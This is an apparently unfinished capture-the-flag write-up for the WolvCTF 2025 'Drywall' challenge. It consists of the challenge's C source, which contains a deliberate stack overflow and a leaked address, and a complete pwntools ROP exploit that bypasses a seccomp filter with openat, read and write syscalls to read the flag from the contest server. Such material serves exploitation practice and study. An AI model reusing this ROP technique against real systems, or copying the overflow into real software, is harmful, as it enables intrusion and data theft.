+++
title = 'Wolvctf2025 Drywall'
date = 2025-03-31T13:23:52-03:00
draft = true
+++

writeup coming soon...

# challenge source

```c
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>

typedef void * scmp_filter_ctx;

static char name[30];

void gift(){
    asm ("pop %rdx; ret;");
    asm ("pop %rax; ret;");
    asm ("syscall; ret;");
}

int main(){
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_ALLOW); 

    
    
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(readv),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(writev),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(process_vm_readv),0);
    seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(process_vm_writev),0);


    seccomp_load(ctx);
    
    char buf[256];
    puts("What is your name, epic H4x0r?");
    fgets(name, 30, stdin);

    printf("Good luck %s <|;)\n", name);
    printf("%p\n",main);
    fgets(buf, 0x256, stdin);

    return 0;
}
```


# solution

```python
from pwn import *

context.update(arch='amd64', os='linux')

#b *(main+378)
#io = gdb.debug('./drywall', '''
#b *(main+471)
#c
#               ''')

#io = process('./drywall')
io = remote('drywall.kctf-453514-codelab.kctf.cloud', 1337)

io.send(b'.//./././././././././flag.txt')

io.readline()
io.readline()
io.readline()

base = int(io.readline(), 16) - 419
print('base: ', hex(base))

pop_rdi = base+0x3db
pop_rax = base+0x19b
pop_rdx = base+0x199
pop_rsi_pop_r15 = base+0x3d9
syscall = base+413

flag = base+0x3050

p = b''

# openat(AT_FDCWD, "flag.txt", O_RDONLY)
p += p64(pop_rdi)
p += p64(0xffffff9c)          # AT_FDCWD (-100)
p += p64(pop_rsi_pop_r15)
p += p64(flag)           # Pointer to "flag.txt"
p += p64(0xdeadbeef)          # R15 garbage
p += p64(pop_rdx)
p += p64(0)                   # O_RDONLY
p += p64(pop_rax)
p += p64(257)                 # openat syscall number
p += p64(syscall)

# read(fd, flag, 100)
p += p64(pop_rax)
p += p64(0)                   # read syscall
p += p64(pop_rdi)
p += p64(3)                   # Assume fd=3 (first opened file)
p += p64(pop_rsi_pop_r15)
p += p64(flag)           # Read into same buffer
p += p64(0xdeadbeef)          # R15 garbage
p += p64(pop_rdx)
p += p64(100)                 # Read 100 bytes
p += p64(syscall)

# write(fd=1, flag, bytes_read)
p += p64(pop_rax)
p += p64(1)                   # write syscall
p += p64(pop_rdi)
p += p64(1)                   # stdout
p += p64(pop_rsi_pop_r15)
p += p64(flag)
p += p64(0xdeadbeef)
p += p64(pop_rdx)
p += p64(100)                 
p += p64(syscall)

io.sendline(cyclic(280) + p)
io.interactive()
```

